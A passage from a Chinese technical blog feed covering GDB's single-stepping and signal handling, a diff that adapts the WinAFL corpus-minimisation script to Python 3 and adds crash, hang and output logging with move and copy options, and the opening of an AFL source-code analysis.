"https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/blog/image-20210527093518978.png" alt="image-20210527093518978"></p></li></ul><h3 id="跨越函数"><a href="#跨越函数" class="headerlink" title="跨越函数"></a>跨越函数</h3><p>我们知道 next 是不会进入函数内部的，下面会介绍一下其原理。</p><p>next 命令跨越函数调用的过程： </p><ul><li>从当前停止位置开始走<strong>指令级</strong>单步； </li><li>走到子函数第一条指令时发现是函数调用，就在函数返 回地址插入一个临时断点； </li><li>让目标程序继续运行，通过子函数体，直至遇到之前插入的临时断点； </li><li>继续走指令级单步，直至满足 next 命令的结束条件为止。</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/blog/image-20210527093915896.png" alt="image-20210527093915896"></p><h2 id="step-、nexti-、-stepi"><a href="#step-、nexti-、-stepi" class="headerlink" title="step 、nexti 、 stepi"></a>step 、nexti 、 stepi</h2><ul><li>step 命令和 next 命令一样，也是实现 c 源代码级的单步，对于简单 语句， step 完全等同于 next 。唯一不同的是，若单步过程中遇到函 数调用， step 命令将停止在子函数的起始处，而不是将其跨越（无 调试信息的子函数除外）。  </li><li>nexti 命令实现指令级单步，和 next 命令类似， nexti 命令单步过程中不会进入子函数调用。 </li><li>stepi 命令实现指令级单步，而且是严格的指令级单步，每次直接走 一条指令后即停止，不再区分是否存在函数调用。</li></ul><h2 id="finish"><a href="#finish" class="headerlink" title="finish"></a>finish</h2><p>finish 命令会让目标程序继续执行完当前函数的剩余语句，并停止在 返回到上一级函数之后的第一条指令处（也就是调用当前函数时的返 回地址）。因此，实现 finish 命令时，只需找到当前函数的返回地址 ，并在该处插入一个临时断点，然后让目标程序继续运行，直至遇到 该断点而停止。</p><h2 id="随机信号的处理"><a href="#随机信号的处理" class="headerlink" title="随机信号的处理"></a>随机信号的处理</h2><p>对于 gdb 而言，导致目标程序本次停止的信号有随机和非随机之分。 非随机信号是指 gdb 已经预知其会发生或者本身就是 gdb 导致的信 号，也就是说，这些信号是具有明确的调试含义的，比如遇到断点指 令时的 SIGTRAP 。而随机信号则是 gdb 没有预知的、不了解其实际 含义的信号，比如因程序异常而导致的 SIGSEGV ，因定时机制而产 生的 SIGALRM ，或者是用户程序自己内部使用的信号。 </p><p>对于随机信号， gdb 提供了两个属性来决定对它的处理方式。一个是 当此信号发生时是否停止目标程序的运行，一个是在目标程序因此信 号而停止之后，用户发出继续目标程序运行的命令时，是否将此信号 交付给目标程序。 </p><p>可通过 info signals 命令查看信号的配置属性，并通过 handle signal 命令来修改信号的属性。</p><h1 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h1><p>先占个坑。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://hiberabyss.github.io/2018/04/04/gdb-internal/">https://hiberabyss.github.io/2018/04/04/gdb-internal/</a></p><p><a href="https://www.cnblogs.com/xsln/p/ptrace.html">https://www.cnblogs.com/xsln/p/ptrace.html</a></p><p><a href="http://www.kgdb.info/wp-content/uploads/2011/04/GdbPrincipleChinese.pdf">http://www.kgdb.info/wp-content/uploads/2011/04/GdbPrincipleChinese.pdf</a></p><p><a href="https://cloud.tencent.com/developer/article/1742878">https://cloud.tencent.com/developer/article/1742878</a></p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> debug </category>
          
      </categories>
      
      
        <tags>
            
            <tag> debug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>魔改 Winafl-cmin.</title>
      <link href="posts/d9205468/"/>
      <url>posts/d9205468/</url>
      
        <content type="html"><![CDATA[<p>魔改的原因是某次在精简大概 2w+的样本时候，程序跑到最后一个文件崩溃了…这不仅要浪费大量时间去再次精简，对于我本人的心情也影响极大，所以抽了一点时间对该工具进行了魔改，魔改的也非常简单，但是基本解决了我目前所碰到的问题。</p><p>魔改后支持如下：</p><ol><li>支持 python3</li><li>增加 <code>output.txt</code> <code>crash_files.txt</code> <code>hang_files.txt</code> 分别记录输出文件、crash 文件、 hang 文件</li><li>增加 <code>-move</code> 命令，用以移动文件，我预想的场景是：精简过程中程序卡死，我们可以把已经筛选过得文件剔除出来，会节约很多时间。但是相应的精简的效果可能会对比正常结束略差，我们进行二次精简就可以了。</li><li>增加 <code>-copy</code> 命令，用以复制文件。</li></ol><p>大致更改的代码如下：</p><p><a href="https://github.com/0xfocu5/tools/blob/main/my-cmin.py">https://github.com/0xfocu5/tools/blob/main/my-cmin.py</a></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--- winafl-cmin.py2021-05-18 15:02:53.000000000 +0800</span></span><br><span class="line"><span class="comment">+++ my-cmin.py2021-05-20 11:54:55.000000000 +0800</span></span><br><span class="line"><span class="meta">@@ -286,6 +286,7 @@</span></span><br><span class="line">         &#x27;--skip-dry-run&#x27;, action = &#x27;store_true&#x27;, default = False,</span><br><span class="line">         help = &#x27;Skip the dry-run step even if it failed&#x27;</span><br><span class="line">     )</span><br><span class="line"><span class="addition">+    </span></span><br><span class="line">     parser.add_argument(</span><br><span class="line">         &#x27;target_cmdline&#x27;, nargs = argparse.REMAINDER,</span><br><span class="line">         help = &#x27;target command line&#x27;</span><br><span class="line"><span class="meta">@@ -305,10 +306,46 @@</span></span><br><span class="line">     # Now we can copy the file to destination</span><br><span class="line">     shutil.copy(filepath, new_dest)</span><br><span class="line">     </span><br><span class="line"><span class="addition">+def MvArgsparse():</span></span><br><span class="line"><span class="addition">+    parser = argparse.ArgumentParser(description=&#x27;Move setting&#x27;)</span></span><br><span class="line"><span class="addition">+    parser.add_argument(</span></span><br><span class="line"><span class="addition">+        &#x27;-mv&#x27;, &#x27;--move&#x27;, action = &#x27;append&#x27;, required = True,</span></span><br><span class="line"><span class="addition">+        metavar = &#x27;dir&#x27;, help = &#x27;Move files to output folder.&#x27;</span></span><br><span class="line"><span class="addition">+        &#x27; Mostly used for reuse after the process is stuck.&#x27;</span></span><br><span class="line"><span class="addition">+    )</span></span><br><span class="line"><span class="addition">+    parser.add_argument(</span></span><br><span class="line"><span class="addition">+        &#x27;-o&#x27;, &#x27;--output&#x27;, required = True,</span></span><br><span class="line"><span class="addition">+        metavar = &#x27;dir&#x27;, help = &#x27;output directory for files.&#x27;</span></span><br><span class="line"><span class="addition">+        &#x27;Absolute path is better.&#x27;</span></span><br><span class="line"><span class="addition">+    )</span></span><br><span class="line"><span class="addition">+    return parser.parse_args()</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+def CpArgsparse():</span></span><br><span class="line"><span class="addition">+    parser = argparse.ArgumentParser(description=&#x27;Copy setting&#x27;)</span></span><br><span class="line"><span class="addition">+    parser.add_argument(</span></span><br><span class="line"><span class="addition">+        &#x27;-cp&#x27;, &#x27;--copy&#x27;, action = &#x27;append&#x27;, required = True,</span></span><br><span class="line"><span class="addition">+        metavar = &#x27;dir&#x27;, help = &#x27;Copy files to output folder.&#x27;</span></span><br><span class="line"><span class="addition">+        &#x27; Mostly used for reuse after the process is stuck.&#x27;</span></span><br><span class="line"><span class="addition">+    )</span></span><br><span class="line"><span class="addition">+    parser.add_argument(</span></span><br><span class="line"><span class="addition">+        &#x27;-o&#x27;, &#x27;--output&#x27;, required = True,</span></span><br><span class="line"><span class="addition">+        metavar = &#x27;dir&#x27;, help = &#x27;output directory for files.&#x27;</span></span><br><span class="line"><span class="addition">+        &#x27;Absolute path is better.&#x27;</span></span><br><span class="line"><span class="addition">+    )</span></span><br><span class="line"><span class="addition">+    return parser.parse_args()</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+def check_file(file):</span></span><br><span class="line"><span class="addition">+    if os.path.isfile(file):</span></span><br><span class="line"><span class="addition">+        print(&#x27;[+] %s has been deleted, new file will be generated.&#x27; %file)</span></span><br><span class="line"><span class="addition">+        command = &quot;del &quot;</span></span><br><span class="line"><span class="addition">+        command = command + file</span></span><br><span class="line"><span class="addition">+        os.system(command)</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> def main(argc, argv):</span><br><span class="line"><span class="deletion">-    print &#x27;corpus minimization tool for WinAFL by &lt;0vercl0k@tuxfamily.org&gt;&#x27;</span></span><br><span class="line"><span class="deletion">-    print &#x27;Based on WinAFL by &lt;ifratric@google.com&gt;&#x27;</span></span><br><span class="line"><span class="deletion">-    print &#x27;Based on AFL by &lt;lcamtuf@google.com&gt;&#x27;</span></span><br><span class="line"><span class="addition">+    print(&#x27;corpus minimization tool for WinAFL by &lt;0vercl0k@tuxfamily.org&gt;&#x27;)</span></span><br><span class="line"><span class="addition">+    print(&#x27;Based on WinAFL by &lt;ifratric@google.com&gt;&#x27;)</span></span><br><span class="line"><span class="addition">+    print(&#x27;Based on AFL by &lt;lcamtuf@google.com&gt;&#x27;)</span></span><br><span class="line"><span class="addition">+    print(&#x27;Changed by 0xfocu5 &lt;o0xfocu5@gmail.com&gt;&#x27;)</span></span><br><span class="line"> </span><br><span class="line">     logging.basicConfig(</span><br><span class="line">         filename = &#x27;winafl-cmin.log&#x27;,</span><br><span class="line"><span class="meta">@@ -316,7 +353,48 @@</span></span><br><span class="line">         format = &#x27;%(asctime)s [%(levelname)-5.5s] [%(funcName)s] %(message)s&#x27;</span><br><span class="line">     )</span><br><span class="line"> </span><br><span class="line"><span class="addition">+    if (argv[1] == &#x27;-mv&#x27; or argv[1] == &quot;-move&quot;):</span></span><br><span class="line"><span class="addition">+        args = MvArgsparse()</span></span><br><span class="line"><span class="addition">+        file = &quot;&quot;.join(args.move)  </span></span><br><span class="line"><span class="addition">+        if os.path.isfile(file) is False:</span></span><br><span class="line"><span class="addition">+            print(&#x27;[!] The argument of \&#x27;- move\&#x27; %s is not a file. Or it doesn\&#x27;t exist&#x27; %(file))</span></span><br><span class="line"><span class="addition">+            return 1</span></span><br><span class="line"><span class="addition">+        if os.path.isdir(args.output):</span></span><br><span class="line"><span class="addition">+           print(&#x27;[!] %s already exists, please remove it to avoid data loss.&#x27; %(args.output))</span></span><br><span class="line"><span class="addition">+           return 1</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+        path = os.getcwd()+&quot;\\&quot;+str(args.output)</span></span><br><span class="line"><span class="addition">+        os.mkdir(args.output)</span></span><br><span class="line"><span class="addition">+        for line in open(file): </span></span><br><span class="line"><span class="addition">+            line = line.strip(&quot;\n&quot;)</span></span><br><span class="line"><span class="addition">+            print(&quot;Move %s to %s&quot; %(line, path))</span></span><br><span class="line"><span class="addition">+            shutil.move(line, path)</span></span><br><span class="line"><span class="addition">+        return 0</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+    elif(argv[1] == &#x27;-cp&#x27; or argv[1] == &quot;-copy&quot;):</span></span><br><span class="line"><span class="addition">+        args = CpArgsparse()</span></span><br><span class="line"><span class="addition">+        file = &quot;&quot;.join(args.copy)  </span></span><br><span class="line"><span class="addition">+        if os.path.isfile(file) is False:</span></span><br><span class="line"><span class="addition">+            print(&#x27;[!] The argument of \&#x27;- move\&#x27; %s is not a file. Or it doesn\&#x27;t exist&#x27; %(file))</span></span><br><span class="line"><span class="addition">+            return 1</span></span><br><span class="line"><span class="addition">+        if os.path.isdir(args.output):</span></span><br><span class="line"><span class="addition">+           print(&#x27;[!] %s already exists, please remove it to avoid data loss.&#x27; %(args.output))</span></span><br><span class="line"><span class="addition">+           return 1</span></span><br><span class="line"><span class="addition">+        output = []</span></span><br><span class="line"><span class="addition">+        for line in open(file): </span></span><br><span class="line"><span class="addition">+            line = line.strip(&quot;\n&quot;)</span></span><br><span class="line"><span class="addition">+            output.append(line)</span></span><br><span class="line"><span class="addition">+        path = os.getcwd()+&quot;\\&quot;+str(args.output)</span></span><br><span class="line"><span class="addition">+        os.mkdir(args.output)</span></span><br><span class="line"><span class="addition">+        for file_path in output:</span></span><br><span class="line"><span class="addition">+            print(&quot;Copy %s to %s&quot; %(file_path, path))</span></span><br><span class="line"><span class="addition">+            do_unique_copy(file_path, args.output)</span></span><br><span class="line"><span class="addition">+        return 0</span></span><br><span class="line"><span class="addition">+    </span></span><br><span class="line">     args = setup_argparse()</span><br><span class="line"><span class="addition">+    check_file(&quot;output.txt&quot;)</span></span><br><span class="line"><span class="addition">+    check_file(&quot;crash_files.txt&quot;)</span></span><br><span class="line"><span class="addition">+    check_file(&quot;hang_files.txt&quot;)</span></span><br><span class="line">     cli_handler = logging.StreamHandler(sys.stdout)</span><br><span class="line">     cli_handler.setLevel(args.verbose)</span><br><span class="line">     logging.getLogger().addHandler(cli_handler)</span><br><span class="line"><span class="meta">@@ -419,7 +497,7 @@</span></span><br><span class="line">     # Do a dry run with the first file in the set</span><br><span class="line">     logging.info(&#x27;[*] Testing the target binary...&#x27;)</span><br><span class="line">     f = AFLShowMapWorker(args)</span><br><span class="line"><span class="deletion">-    results = map(f, (inputs[0], inputs[0]))</span></span><br><span class="line"><span class="addition">+    results = list(map(f, (inputs[0], inputs[0])))</span></span><br><span class="line">     if results[0] != results[1]:</span><br><span class="line">         logging.error(&#x27;[!] Dry-run failed, 2 executions resulted differently:&#x27;)</span><br><span class="line">         logging.error(</span><br><span class="line"><span class="meta">@@ -435,7 +513,6 @@</span></span><br><span class="line">             return 1</span><br><span class="line"> </span><br><span class="line"><span class="meta">@@ -497,12 +571,10 @@</span></span><br><span class="line"> </span><br><span class="line">     # Counter tracking how many files we have been through already.</span><br><span class="line">     i = 1</span><br><span class="line"><span class="deletion">-    for result in p.imap_unordered(</span></span><br><span class="line"><span class="deletion">-        AFLShowMapWorker(args),</span></span><br><span class="line"><span class="deletion">-        inputs</span></span><br><span class="line"><span class="deletion">-    ):</span></span><br><span class="line"><span class="deletion">-        print &#x27;\rProcessing file %d/%d...&#x27; % (i, inputs_len),</span></span><br><span class="line"><span class="addition">+    for result in p.imap_unordered(AFLShowMapWorker(args), inputs):</span></span><br><span class="line"><span class="addition">+        print(&#x27;\rProcessing file %d/%d...&#x27; % (i, inputs_len)),</span></span><br><span class="line">         i += 1</span><br><span class="line"><span class="addition">+</span></span><br><span class="line">         # If the set of tuples is empty, something weird happened</span><br><span class="line">         if len(result.tuples) == 0:</span><br><span class="line">             logging.debug(</span><br><span class="line"><span class="meta">@@ -516,12 +588,15 @@</span></span><br><span class="line">         if result.returncode != wanted_returncode:</span><br><span class="line">             if result.returncode == 1:</span><br><span class="line">                 hang_files.append(result.path)</span><br><span class="line"><span class="deletion">-</span></span><br><span class="line"><span class="addition">+                with open(&#x27;hang_files.txt&#x27;, &#x27;a+&#x27;) as f:</span></span><br><span class="line"><span class="addition">+                    f.write(result.path+&quot;\n&quot;)</span></span><br><span class="line">             # If the mode crash only is enabled, we track the non-crashing</span><br><span class="line">             # test cases in the same tuple.</span><br><span class="line">             if (result.returncode == 2 and args.crash_only is False) or \</span><br><span class="line">                (result.returncode == 0 and args.crash_only):</span><br><span class="line">                 crash_files.append(result.path)</span><br><span class="line"><span class="addition">+                with open(&#x27;crash_files.txt&#x27;, &#x27;a+&#x27;) as f:</span></span><br><span class="line"><span class="addition">+                    f.write(result.path+&quot;\n&quot;)</span></span><br><span class="line"> </span><br><span class="line">             if args.crash_only is False:</span><br><span class="line">                 logging.debug(</span><br><span class="line"><span class="meta">@@ -539,14 +614,13 @@</span></span><br><span class="line">             continue</span><br><span class="line"> </span><br><span class="line">         totalsize += result.filesize</span><br><span class="line"><span class="deletion">-</span></span><br><span class="line">         # Generate the list of unique tuples while processing the results,</span><br><span class="line">         # also keep track of their popularities.</span><br><span class="line">         uniq_tuples.update(result.tuples.keys())</span><br><span class="line"> </span><br><span class="line">         # Keep an updated dictionary mapping a tuple to the fittest file</span><br><span class="line">         # of all the paths.</span><br><span class="line"><span class="deletion">-        for tuple_id, tuple_hitcount in result.tuples.iteritems():</span></span><br><span class="line"><span class="addition">+        for tuple_id, tuple_hitcount in result.tuples.items():</span></span><br><span class="line">             fileinfo = &#123;</span><br><span class="line">                 &#x27;size&#x27; : result.filesize,</span><br><span class="line">                 &#x27;path&#x27; : result.path,</span><br><span class="line"><span class="meta">@@ -573,6 +647,10 @@</span></span><br><span class="line">             else:</span><br><span class="line">                 candidates[tuple_id] = fileinfo</span><br><span class="line"> </span><br><span class="line"><span class="addition">+        with open(&#x27;output.txt&#x27;, &#x27;a+&#x27;) as f:</span></span><br><span class="line"><span class="addition">+                    f.write(result.path+&quot;\n&quot;) </span></span><br><span class="line"><span class="addition">+            </span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line">     len_crash_files, len_hang_files, len_empty_tuple_files = map(</span><br><span class="line">         len, (crash_files, hang_files, empty_tuple_files)</span><br><span class="line">     )</span><br><span class="line"><span class="meta">@@ -586,6 +664,7 @@</span></span><br><span class="line">         &#x27;[+] Found %d unique tuples across %d files&#x27;,</span><br><span class="line">         len_uniq_tuples, effective_len</span><br><span class="line">     )</span><br><span class="line"><span class="addition">+</span></span><br><span class="line">     if len_hang_files &gt; 0:</span><br><span class="line">         logging.info(&#x27;  - %d files triggered a hang&#x27;, len_hang_files)</span><br><span class="line">         for hang_file in hang_files:</span><br><span class="line"><span class="meta">@@ -609,7 +688,6 @@</span></span><br><span class="line">             logging.debug(&#x27;    - %s generated an empty tuple&#x27;, empty_tuple_file)</span><br><span class="line"> </span><br><span class="line">     logging.info(&#x27;[*] Finding best candidates for each tuple...&#x27;)</span><br><span class="line"><span class="deletion">-</span></span><br><span class="line">     # Using the same strategy than in afl-cmin, quoting lcamtuf:</span><br><span class="line">     # &#x27;&#x27;&#x27;</span><br><span class="line">     # The &quot;best&quot; part is understood simply as the smallest input that</span><br><span class="line"><span class="meta">@@ -631,7 +709,7 @@</span></span><br><span class="line"> </span><br><span class="line">         # Remove the other tuples also exercised by the candidate</span><br><span class="line">         # from the remaining_tuples list.</span><br><span class="line"><span class="deletion">-        for tuple_exercised in candidate[&#x27;tuples&#x27;].iterkeys():</span></span><br><span class="line"><span class="addition">+        for tuple_exercised in candidate[&#x27;tuples&#x27;].keys():</span></span><br><span class="line">             # Remove the tuples exercised if we have not</span><br><span class="line">             # removed them already from the</span><br><span class="line">             # remaining_tuples list.</span><br><span class="line"><span class="meta">@@ -640,15 +718,16 @@</span></span><br><span class="line"> </span><br><span class="line">         # Keep track of the final minset and its size.</span><br><span class="line">         minset.append(candidate[&#x27;path&#x27;])</span><br><span class="line"><span class="addition">+        </span></span><br><span class="line">         minsetsize += candidate[&#x27;size&#x27;]</span><br><span class="line"> </span><br><span class="line">         # We are now done with this tuple, we can get rid of it.</span><br><span class="line">         del candidates[tuple_]</span><br><span class="line"> </span><br><span class="line"><span class="deletion">-        print &#x27;\rProcessing tuple %d/%d...&#x27; % (</span></span><br><span class="line"><span class="addition">+        print(&#x27;\rProcessing tuple %d/%d...&#x27; % (</span></span><br><span class="line">             len_uniq_tuples - len(remaining_tuples),</span><br><span class="line">             len_uniq_tuples</span><br><span class="line"><span class="deletion">-        ),</span></span><br><span class="line"><span class="addition">+        )),</span></span><br><span class="line"> </span><br><span class="line">         # If we don&#x27;t have any more tuples left, we are done.</span><br><span class="line">         if len(remaining_tuples) == 0:</span><br><span class="line"><span class="meta">@@ -670,10 +749,14 @@</span></span><br><span class="line">             &#x27;[*] Saving the minset in %s...&#x27;, os.path.abspath(args.output)</span><br><span class="line">         )</span><br><span class="line">         os.mkdir(args.output)</span><br><span class="line"><span class="addition">+        os.system(&quot;del output.txt&quot;)</span></span><br><span class="line">         for file_path in minset:</span><br><span class="line"><span class="addition">+            with open(&#x27;output.txt&#x27;, &#x27;a+&#x27;) as f:</span></span><br><span class="line"><span class="addition">+                f.write(file_path+&quot;\n&quot;)</span></span><br><span class="line">             do_unique_copy(file_path, args.output)</span><br><span class="line"> </span><br><span class="line">     logging.info(&#x27;[+] Time elapsed: %d seconds&#x27;, time.time() - t0)</span><br><span class="line"><span class="addition">+    </span></span><br><span class="line">     return 0</span><br><span class="line"> </span><br><span class="line"> if __name__ == &#x27;__main__&#x27;:</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Fuzz </category>
          
          <category> Winafl </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fuzz </tag>
            
            <tag> Tool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AFL 源码分析</title>
      <link href="posts/e04d4cd1/"/>
      <url>posts/e04d4cd1/</url>
      
        <content type="html"><![CDATA[<p>整体看的比较匆忙:(</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20201119171914.jpg" alt="15710161322527"></p><h1 id="Fuzz流程"><a href="#Fuzz流程" class="headerlink" title="Fuzz流程"></a>Fuzz流程</h1><ol><li><p>afl_fuzz的main函数会解析用户输入命令，检查环境变量的设置、输入输出路径、目标文件。程序定义了结构体<strong>queue_entry</strong>链表维护fuzz中使用的文件。</p></li><li><p>函数<strong>perform_dry_run()</strong> 会使用初始的测试用例进行测试，确保目标程序能够正常执行,生成初始化的queue和bitmap。</p></li><li><p>函数 <strong>cull_queue()</strong> 会对初始队列进行筛选（更新favored entry）。遍历top_rated[]中的queue，然后提取出发现新edge的entry，并标记为favored，使得在下次遍历queue时，这些entry能获得更多执行fuzz的机会。</p></li><li><p>进入while(1)开始fuzz循环</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">进入循环后第一部还是 cull_queue() 对queue进行筛选</span><br><span class="line">判断queue_cur是否为空，如果是，则表示已经完成对队列的遍历，初始化相关参数，重新开始遍历队列</span><br><span class="line">fuzz_one() 函数会对queue_cur所对应文件进行fuzz，包括(跳过calibrate_case -修剪测试用例 -对用例评分 - 确定性变异或直接havoc&amp;ssplice)</span><br><span class="line">判断是否结束，更新queue_cur和current_entry</span><br><span class="line">当队列中的所有文件都经过变异测试了，则完成一次”cycle done”。整个队列又会从第一个文件开始，再次继续进行变异</span><br></pre></td></tr></table></figure></li></ol><p>其主要流程都写在<code>main</code>函数里面了，我们分析一下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span 